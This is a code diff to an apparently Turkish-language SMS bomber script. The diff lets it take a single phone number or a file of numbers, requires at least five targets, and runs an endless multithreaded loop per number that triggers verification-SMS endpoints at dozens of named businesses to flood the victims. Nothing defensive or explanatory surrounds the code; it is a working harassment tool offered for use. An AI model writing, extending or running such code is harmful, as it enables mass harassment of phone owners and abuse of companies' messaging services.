@@ -13,7 +13,6 @@ for attribute in dir(SendSms):
     
             
 while 1:
-  
     system("cls||clear")
     print(f"""{Fore.LIGHTBLUE_EX}
 
@@ -135,17 +134,41 @@ while 1:
         break
     elif menu == 2:
         system("cls||clear")
-        print(Fore.LIGHTBLUE_EX + "Telefon numarasını başında '+90' olmadan yazınız: "+ Fore.LIGHTBLUE_EX, end="")
+        print(Fore.LIGHTBLUE_EX + "Telefon numarasını başında '+90' olmadan yazınız (Birden çoksa 'enter' tuşuna basınız): "+ Fore.LIGHTBLUE_EX, end="")
         tel_no = input()
-        try:
-            int(tel_no)
-            if len(tel_no) != 10:
-                raise ValueError
-        except ValueError:
+        tel_liste = []
+        if tel_no == "": 
             system("cls||clear")
-            print(Fore.RED + "Hatalı telefon numarası. Tekrar deneyiniz.") 
+            print(Fore.LIGHTBLUE_EX + "Telefon numaralarının kayıtlı olduğu dosyanın dizinini yazınız: "+ Fore.LIGHTBLUE_EX, end="")
+            dizin = input()
+            try:
+                with open(dizin, "r", encoding="utf-8") as f:
+                    for i in f.read().strip().split("\n"):
+                        if len(i) == 10:
+                            tel_liste.append(i)
+            except FileNotFoundError:
+                system("cls||clear")
+                print(Fore.RED + "Hatalı dosya dizini. Tekrar deneyiniz.")
+                sleep(3)
+                continue
+        else:
+            try:
+                int(tel_no)
+                if len(tel_no) != 10:
+                    raise ValueError
+                tel_liste.append(tel_no)
+            except ValueError:
+                system("cls||clear")
+                print(Fore.RED + "Hatalı telefon numarası. Tekrar deneyiniz.") 
+                sleep(3)
+                continue
+        
+        if len(tel_liste) < 5:
+            system("cls||clear")
+            print(Fore.RED + "En az 5 telefon numarası girmelisiniz!")
             sleep(3)
             continue
+            
         system("cls||clear")
         try:
             print(Fore.LIGHTBLUE_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTBLUE_EX, end="")
@@ -157,46 +180,30 @@ while 1:
             print(Fore.RED + "Hatalı mail adresi. Tekrar deneyiniz.") 
             sleep(3)
             continue
-        system("cls||clear")
-        send_sms = SendSms(tel_no, mail)
-        try:
+        
+        def attack_number(number):
+            send_sms = SendSms(number, mail)
             while True:
                 with ThreadPoolExecutor() as executor:
                     futures = [
                         executor.submit(send_sms.Akasya),
-                        executor.submit(send_sms.Akbati),
                         executor.submit(send_sms.Ayyildiz),
                         executor.submit(send_sms.Baydoner),
-                        executor.submit(send_sms.Beefull),
-                        executor.submit(send_sms.Bim),
                         executor.submit(send_sms.Bisu),
                         executor.submit(send_sms.Bodrum),
                         executor.submit(send_sms.Clickme),
                         executor.submit(send_sms.Dominos),
-                        executor.submit(send_sms.Englishhome),
-                        executor.submit(send_sms.Evidea),
                         executor.submit(send_sms.File),
                         executor.submit(send_sms.Frink),
-                        executor.submit(send_sms.Happy),
-                        executor.submit(send_sms.Hayatsu),
                         executor.submit(send_sms.Hey),
                         executor.submit(send_sms.Hizliecza),
                         executor.submit(send_sms.Icq),
                         executor.submit(send_sms.Ipragaz),
-                        executor.submit(send_sms.Istegelsin),
-                        executor.submit(send_sms.Joker),
                         executor.submit(send_sms.KahveDunyasi),
                         executor.submit(send_sms.KimGb),
-                        executor.submit(send_sms.Komagene),
-                        executor.submit(send_sms.Koton),
                         executor.submit(send_sms.KuryemGelsin),
-                        executor.submit(send_sms.Macro),
-                        executor.submit(send_sms.Metro),
-                        executor.submit(send_sms.Migros),
-                        executor.submit(send_sms.Naosstars),
                         executor.submit(send_sms.Paybol),
                         executor.submit(send_sms.Pidem),
-                        executor.submit(send_sms.Porty),
                         executor.submit(send_sms.Qumpara),
                         executor.submit(send_sms.Starbucks),
                         executor.submit(send_sms.Suiste),
@@ -205,21 +212,17 @@ while 1:
                         executor.submit(send_sms.Tasimacim),
                         executor.submit(send_sms.Tazi),
                         executor.submit(send_sms.TiklaGelsin),
-                        executor.submit(send_sms.ToptanTeslim),
                         executor.submit(send_sms.Ucdortbes),
-                        executor.submit(send_sms.Uysal),
-                        executor.submit(send_sms.Wmf),
                         executor.submit(send_sms.Yapp),
-                        executor.submit(send_sms.YilmazTicaret),
                         executor.submit(send_sms.Yuffi),
-                        executor.submit(send_sms.Papara),
-                        executor.submit(send_sms.İninal),
-                        executor.submit(send_sms.ParolaPara),
                         executor.submit(send_sms.Keyubu),
-                        #eklenecekler
-                        #steam , telegram, yemeksepeti
                     ]
                     wait(futures)
+        
+        try:
+            with ThreadPoolExecutor(max_workers=len(tel_liste)) as executor:
+                futures = [executor.submit(attack_number, number) for number in tel_liste]
+                wait(futures)
         except KeyboardInterrupt:
             system("cls||clear")
             print("\nCtrl+C tuş kombinasyonu algılandı. Menüye dönülüyor..")
